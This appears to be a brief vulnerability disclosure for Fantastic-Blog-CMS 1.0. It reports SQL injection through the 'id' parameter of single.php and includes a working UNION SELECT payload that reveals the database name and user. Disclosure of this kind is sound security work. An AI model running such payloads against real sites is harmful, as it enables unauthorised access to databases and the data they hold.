* Exploit Title: Fantastic-Blog-CMS 1.0-SQL Injection
* VULNERABLE:  An attacker can inject query in "/fantasticblog/single.php" via the "id=5" parameters.
* Vendor Homepage：https://www.sourcecodester.com/php/12258/fantastic-blog-cms-php.html
* Software Link:https: https://www.sourcecodester.com/download-code?nid=12258&title=Fantastic+Blog+%28CMS%29+in+PHP+with+Source+Code
* Version: 1.0
* Vulnerable file: single.php

![image](https://user-images.githubusercontent.com/57030243/160570899-903e2efc-1df8-4d56-ad23-23378d4c98f2.png)
* Vulnerability proof ：
payload:id=' union select 1,database(),3,user(),5,6,7,8,9--+-

![image](https://user-images.githubusercontent.com/57030243/160573362-bdb4011a-b3c8-4621-868e-30469ba9acec.png)
![image](https://user-images.githubusercontent.com/57030243/160571679-d267b43c-f3ec-41be-a34f-03a2693ccccf.png)


